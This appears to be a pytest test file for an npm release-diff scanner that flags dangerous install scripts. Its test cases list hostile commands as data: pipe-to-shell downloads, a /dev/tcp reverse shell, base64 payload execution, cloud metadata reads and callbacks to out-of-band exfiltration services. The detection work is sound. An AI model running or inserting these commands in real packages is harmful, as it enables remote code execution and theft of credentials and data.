"""An install-time script that pipes into a shell, opens a network shell, decodes a payload, reads cloud
metadata or calls a callback service is far worse than `node scripts/build.js`. The check is plain,
case-insensitive substrings (no regex) and looks only at install scripts this release adds or changes."""
import pytest

from npmdiffwatch import differ, engine, rules
from npmdiffwatch.config import Config
from npmdiffwatch.models import ArtifactSet
from npmdiffwatch.orchestrator import _load_ruleset

RULE = "pkg-install-script-dangerous"


def _fired(new_scripts, old_scripts=None, prior=True):
    import json
    new = {"package.json": json.dumps({"name": "p", "version": "1.0.1", "scripts": new_scripts}).encode()}
    old = {"package.json": json.dumps({"name": "p", "version": "1.0.0", "scripts": old_scripts or {}}).encode()}
    a = ArtifactSet("p", "1.0.1", "1.0.0" if prior else None, "tgz", new, old if prior else {}, {})
    cfg = Config()
    return {r.rule for r in engine.triage(differ.build_diff(a), cfg, _load_ruleset(cfg)).fired_rules}


@pytest.mark.parametrize("script", [
    "curl -fsSL https://example.test/i.sh | bash",
    "wget -qO- https://example.test/i |sh",
    "curl -s https://example.test/i | sh -s -- --yes",
    "echo 'hsab | ...' | rev | bash",
    "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1",
    "echo aGk= | base64 -d > /tmp/x && sh /tmp/x",
    "curl -s http://169.254.169.254/latest/meta-data/ -o /tmp/a",
    "curl -s http://100.100.100.200/latest/meta-data/",
    "curl -s http://metadata.google.internal/computeMetadata/v1/",
    "nslookup abc123.example.test",
    "curl -X POST -d @/etc/hostname http://xyz.oast.fun/x",
    "curl https://abc.burpcollaborator.net",
    "curl https://abc.oastify.com",
    "ping x.interact.sh",
    "nslookup 1.log.DNSLOG.example",
])
def test_a_dangerous_added_install_script_fires(script):
    assert RULE in _fired({"postinstall": script})


def test_it_fires_on_a_first_release_too():
    assert RULE in _fired({"preinstall": "curl -s https://example.test/x | sh"}, prior=False)


@pytest.mark.parametrize("script", ["node scripts/postinstall.js", "node-gyp rebuild",
                                    "prebuild-install || node-gyp rebuild", "husky install",
                                    "node ./bin/check.js --shell", "prebuild-install || shx cp a b",
                                    "curl -s https://example.test/f.sha | shasum -c", "node x.js"])
def test_ordinary_install_scripts_do_not_fire(script):
    assert RULE not in _fired({"postinstall": script})


def test_a_dangerous_hook_already_in_the_previous_version_does_not_fire_again():
    same = {"postinstall": "curl -s https://example.test/x | bash"}
    assert RULE not in _fired(same, old_scripts=same)


def test_other_scripts_are_not_install_scripts():
    assert RULE not in _fired({"test": "curl -s https://example.test/x | bash", "postinstall": "node x.js"})


def _rule(match):
    return {"id": "r", "applies_to": "package_json", "weight": 10.0, "match": match}


def test_the_check_takes_a_list_of_plain_strings():
    assert rules.validate_rule(_rule({"install_script_contains": ["| bash", "/dev/tcp/"]})) is not None


@pytest.mark.parametrize("bad", ["| bash", [], [""], ["ok", 3], ["x" * 201]])
def test_a_malformed_list_is_rejected(bad):
    assert rules.validate_rule(_rule({"install_script_contains": bad})) is None


def test_the_check_is_package_json_only():
    assert rules.validate_rule({"id": "r", "applies_to": "code", "weight": 10.0,
                                "match": {"install_script_contains": ["| bash"]}}) is None
